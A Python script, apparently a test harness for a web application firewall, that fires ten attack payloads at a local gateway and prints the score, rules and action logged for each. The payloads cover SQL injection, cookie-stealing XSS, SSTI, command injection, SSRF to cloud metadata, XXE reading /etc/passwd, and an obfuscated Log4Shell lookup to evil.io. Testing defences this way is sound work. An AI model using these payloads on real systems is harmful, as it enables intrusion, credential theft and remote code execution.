import httpx, json, time

GW = "http://127.0.0.1:8080"
H = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
     "Accept": "text/html,*/*;q=0.8"}

tests = [
 ("1  SQLi UNION (newlines, no tautology)", "GET", "/search?q=%27%0AUNION%0ASELECT%0ANULL,VERSION(),NULL--%20-", None, None),
 ("2  XSS event-handler polyglot",         "GET", "/search?q=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.cookie)%3E", None, None),
 ("3  SSTI Jinja2 RCE probe",              "GET", "/profile?id={{7*7}}{{config.__class__}}", None, None),
 ("4  Traversal via file:// scheme",       "GET", "/download?file=file:///C:/Windows/System32/drivers/etc/hosts", None, None),
 ("5  CMDi $() + ${IFS} obfuscation",      "GET", "/run?cmd=$(id)${IFS}||uname%20-a", None, None),
 ("6  SSRF decimal-IP to cloud metadata",  "GET", "/search?redirect=http://2852039166/latest/meta-data/iam", None, None),
 ("7  XXE parameter-entity file read",     "POST", "/login",
  '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>',
  "application/xml"),
 ("8  CRLF inject Set-Cookie (forge clearance)", "GET", "/search?q=x%0d%0aSet-Cookie:%20aegis_clear=pwn", None, None),
 ("9  NoSQL + prototype pollution JSON",   "POST", "/login",
  '{"user":{"$gt":""},"__proto__":{"admin":true},"constructor":{"prototype":{"role":"admin"}}}',
  "application/json"),
 ("10 Log4Shell nested obfuscation",       "GET", "/search?q=%24%7B%24%7Blower:j%7D%24%7Blower:n%7Di:ldap://evil.io/a%7D", None, None),
]

for name, method, path, body, ctype in tests:
    h = dict(H)
    if ctype: h["Content-Type"] = ctype
    try:
        if method == "GET":
            r = httpx.get(GW + path, headers=h, timeout=10)
        else:
            r = httpx.post(GW + path, headers=h, content=body, timeout=10)
        code = r.status_code
    except Exception as e:
        code = "ERR " + str(e)[:30]
    time.sleep(0.3)
    logs = httpx.get(GW + "/api/logs", params={"limit": 1}, timeout=5).json()["logs"]
    l = logs[0] if logs else {}
    comp = l.get("components", {})
    rl = ",".join(x.get("label", "")[:22] for x in l.get("rules", []))[:70]
    print("%-46s -> %s | score=%-3s %-9s rules=%-3s ml=%-5s | %s" %
          (name, code, l.get("score", "?"), l.get("action", "?"),
           comp.get("rules", "?"), comp.get("ml", "?"), rl))

print()
print("decision bands: >=81 BLOCK | 31-80 CHALLENGE | <31 ALLOW")
